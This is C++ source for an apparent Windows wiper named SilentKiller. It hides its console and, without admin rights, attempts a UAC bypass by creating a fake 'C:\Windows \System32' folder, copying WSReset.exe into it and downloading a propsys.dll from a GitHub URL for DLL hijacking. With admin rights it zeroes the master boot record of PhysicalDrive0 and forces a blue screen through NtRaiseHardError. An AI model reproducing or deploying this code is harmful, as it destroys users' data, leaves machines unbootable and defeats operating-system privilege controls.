#include <iostream>
#include <windows.h>
#include <urlmon.h>
#include <winternl.h>
#define tozero(p,s) (void)memset(p,0,s)
#define MBR 512
#pragma comment(lib , "Urlmon")
using namespace std;

// Definitions of function types for Windows API calls
typedef NTSTATUS(NTAPI* pdef_NtRaiseHardError)(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask OPTIONAL, PULONG_PTR Parameters, ULONG ResponseOption, PULONG Response);
typedef NTSTATUS(NTAPI* pdef_RtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);

// Function to check if the program is running with administrator privileges
bool chkadmin()
{
    BOOL fRet = FALSE;
    HANDLE hToken = NULL;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        TOKEN_ELEVATION Elevation;
        DWORD cbSize = sizeof(TOKEN_ELEVATION);
        if (GetTokenInformation(hToken, TokenElevation, &Elevation, sizeof(Elevation), &cbSize)) {
            fRet = Elevation.TokenIsElevated;
        }
    }
    if (hToken) {
        CloseHandle(hToken);
    }
    return fRet;
}

// Function to cause a Blue Screen of Death (BSOD)
void bsod()
{
    BOOLEAN bEnabled;
    ULONG uResp;
    // Get the address of necessary functions from system DLLs
    LPVOID lpFuncAddress = GetProcAddress(LoadLibraryA("ntdll.dll"), "RtlAdjustPrivilege");
    LPVOID lpFuncAddress2 = GetProcAddress(GetModuleHandle("ntdll.dll"), "NtRaiseHardError");
    // Convert the address to pointers to the corresponding functions
    pdef_RtlAdjustPrivilege NtCall = (pdef_RtlAdjustPrivilege)lpFuncAddress;
    pdef_NtRaiseHardError NtCall2 = (pdef_NtRaiseHardError)lpFuncAddress2;
    // Enable the privilege needed to cause a critical error (BSOD)
    NTSTATUS NtRet = NtCall(19, TRUE, FALSE, &bEnabled);
    // Cause a critical error (BSOD)
    NtCall2(STATUS_FLOAT_MULTIPLE_FAULTS, 0, 0, 0, 6, &uResp);
}

// Function to perform bypass actions
void Bypass()
{
    // Create some directories in the system and copy a file from the Internet
    system("mkdir \"C:\\Windows \\\"");
    system("mkdir \"C:\\Windows \\System32\"");
    system("copy C:\\Windows\\System32\\WSReset.exe \"C:\\Windows \\System32\"");
    URLDownloadToFileA(NULL, "https://raw.githubusercontent.com/wh0am178/SilentKiller/main/propsys.dll", "C:\\Windows \\System32\\propsys.dll", 0, NULL);
}

// Function to get the filepath of the executable
string filepath()
{
    char buffer[MAX_PATH] = {0};
    GetModuleFileNameA(NULL, buffer, MAX_PATH);
    return string(buffer);
}

int main(int agrc, char *argv[])
{
    // Hide the console at program startup
    FreeConsole();
    // If the program is not running with administrator privileges
    if (chkadmin() == false)
    {
        // Execute the bypass action
        Bypass();
        // Get the path of the current executable file
        string usr = filepath();
        // Get the path of the user's folder
        string dst = getenv("USERPROFILE");
        // Set the destination path to copy the file
        string dstf = dst + "\\Music\\SilentKiller.exe";
        // Copy the executable file to a specific location in the user's folder
        CopyFileA(usr.c_str(), dstf.c_str(), 0);
        // Execute the exploit
        system("\"C:\\Windows \\System32\\WSReset.exe\"");
        return -1;
    }
    // Variables for writing to disk
    DWORD write;
    char data[MBR];
    // Initialize the data buffer to zero
    tozero(&data, MBR);

    // Open the physical disk for writing
    HANDLE Target = CreateFile("\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
    // Write to the disk
    WriteFile(Target, data, MBR, &write, NULL);
    // Close the disk handle
    CloseHandle(Target);
    // Cause a Blue Screen of Death (BSOD)
    bsod();
    return 0;
}
